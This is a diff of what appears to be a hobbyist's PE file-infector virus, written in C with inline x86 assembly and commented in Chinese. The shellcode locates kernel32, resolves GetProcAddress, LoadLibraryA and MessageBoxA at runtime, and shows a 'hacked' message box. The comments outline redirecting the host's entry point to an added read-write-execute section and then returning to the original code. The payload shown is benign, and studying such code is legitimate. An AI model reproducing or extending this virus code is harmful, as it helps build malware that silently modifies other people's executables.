@@ -26,8 +26,12 @@ void _addr_kernel32();
 void _addr_imagebase();
 void code_end();
 /*
+Attention:MessageBoxA 和 MessageBox 不一样，可能在库中的函数名都加A
     0:先保存入口地址
     1:先把入口地址指向病毒所在的段,在add section时做这个步骤
+     1.1:先找到loadlibraryA(通过getprocAddress,参数为kernel32的基址和loadlibrary的字符串)
+     1.2:加载user32.dll(因为messageboxA在user32.dll中)
+     1.3:找到messageboxA(通过GetprocAddress)
     2:执行玩后跳到原本的入口地址
 */
 __declspec(naked) void code()
@@ -41,20 +45,26 @@ _delta:
 /************************************************************/
 //要保持栈平衡
         call offset _GetBaseKernel32
-        mov [ebx+_addr_kernel32],eax            //返回值eax中保存了kernel32的基地址
+        mov [ebx+_addr_kernel32],eax            //获取kernel32的基地址
+        
         push eax
         call offset _GetGetProcAddrBase
-        mov [ebx+_addr_getprocAddress],eax      //返回值eax中保存了getprocAddress的地址
+        mov [ebx+_addr_getprocAddress],eax      //获取getprocAddress的地址
+        
         pop ecx                                 //ecx中保存了kernel32的句柄
+        //这里即保持了栈平衡也顺便把kernel32的句柄拿出来使用
+        
         lea edx,[ebx + _str_getModuleHandleA]   //edx中保存了字符串的地址
         push edx
         push ecx
         call eax  //调用getprocAddress
         //返回值中包含了 getModuleHandleA的地址
         push 0
-        call eax
+        call eax//调用getMoudleHandle
        //返回值中包含了pe文件基地址
-        mov [ebx + _addr_imagebase],eax//保存基地址,我们新建的这个段是不可写的
+        mov [ebx + _addr_imagebase],eax
+        //保存基地址
+        //（在addsection时要修改section的属性为e0000020）可读可写可执行,不然这个步骤不好做
        
        
         lea edx,[ebx +_str_LoadLibrary]
@@ -63,23 +73,26 @@ _delta:
         push eax
         mov eax,[ebx+_addr_getprocAddress]
         call eax
-        //返回值中包含了loadlibrary的地址
+        //获取loadlibrary的地址
+        
         lea edx,[ebx+_str_user32]
         push edx
-        call eax
+        call eax //调用loadlibaray
         //返回值中包含了user32.dll的基地址
+       
         lea edx,[ebx+_str_MessageBox]
         push edx
         push eax
         mov eax,[ebx+_addr_getprocAddress]
         call eax
-        //返回值中是，messagebox的地址
+       //返回值中是，messagebox的地址
+      
         push 0
         lea edx,[ebx+_str_hacked]
         push edx
         push edx
         push 0
-        call eax
+        call eax//调用messageboxA
 
 
 
